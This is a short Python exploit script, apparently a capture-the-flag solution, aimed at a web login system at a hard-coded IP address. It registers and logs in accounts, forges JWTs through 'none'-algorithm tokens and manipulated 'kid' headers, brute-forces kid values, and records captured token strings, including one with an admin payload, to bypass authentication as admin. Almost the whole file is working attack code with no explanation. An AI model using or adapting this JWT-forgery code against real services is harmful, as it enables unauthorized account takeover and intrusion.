import requests as req

url = 'http://114.116.26.217/'


def token(t):
    print(t)
    res = req.get(url + 'index.php', headers={"Cookie": "token=%s" % t})
    if res.status_code == 200 and b'token error' not in res.content:
        return (t, True)
    return False


def login(u, p):
    res = req.post(url + 'login.php',
                   {"username": u, "password": p}, allow_redirects=False)
    if res.status_code == 302:
        return res.headers['Set-Cookie'][6:]
    return False


def reg(u, p='v'):
    res = req.post(url + 'register.php', {"username": u, "password": p})
    if res.status_code == 200:
        return login(u, p)
    return False


def j(name='v', kid='968'):
    import jwt  # pip install pyjwt
    import sys
    payload = {"name": name}
    headers = {"kid": kid}
    key = sys.argv[1] if len(sys.argv) > 1 else ''
    xx = jwt.encode(payload=payload, key=key,
                    algorithm='sha256', headers=headers)
    return bytes.decode(xx)


def f(name, kid):
    import jwt  # pip install pyjwt
    import sys
    payload = {"name": name}
    headers = {"kid": kid}
    xx = jwt.encode(payload=payload, key=None,
                    algorithm='none', headers=headers)
    return bytes.decode(xx)

if __name__ == '__main__':
    res = reg('v', 'v')
    print(res)
    # print(j('admin', '1'))
    # for i in range(0, 100):
    #     t = j('admin', '%s' % i)
    #     print(i)
    #     print(token(t))
    # print(token(f('v', '968')))
    # print(token(j('v', '968')))
    # print(j('v1', '13233'))
    print(reg('vdmin', 'v'))
    # eyJuYW1lIjoidmRtaW4ifQ
    # eyJuYW1lIjoiYWRtaW4ifQ
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiIyNTEzIn0.eyJuYW1lIjoiYWRtaW4ifQ._QL6k_bhRTafSycSXY7q_8Y5pICS1XAWT_-Kidcc_JU
    # vdmin
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiIyNTEzIn0.eyJuYW1lIjoidmRtaW4ifQ._QL6k_bhRTafSycSXY7q_8Y5pICS1XAWT_-Kidcc_JU
    # v
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI5NjgifQ.eyJuYW1lIjoidiJ9.kEU0SgUtkUug9R65UgLde9HSXpcf0Ik-ed0PPwOHyqQ
    # v1
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiIxMzIzMyJ9.eyJuYW1lIjoidjEifQ.9CDdMEgj1V5mDv1IASWGy0xARqO7FEE9MobgRzxlVNQ
    # v2
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiIxMzIzOCJ9.eyJuYW1lIjoidjIifQ.3gXZlqpO4ZDzOWTyMxaqMiDdTwAwKqcL8gIvfvs3Exk
    # adminv
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiIxMzI0NiJ9.eyJuYW1lIjoiYWRtaW52In0.0J7U5fRX21xqdfSL_IVxZFvjIbN_OR9j8hIpagfzSgw
    # adminadminadminadmin
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiIxNDE1MyJ9.eyJuYW1lIjoiYWRtaW5hZG1pbmFkbWluYWRtaW4ifQ.QPGSryuvwS1uDoJhvVGSRpPDe5OOnp24HilwRYj2Ljw
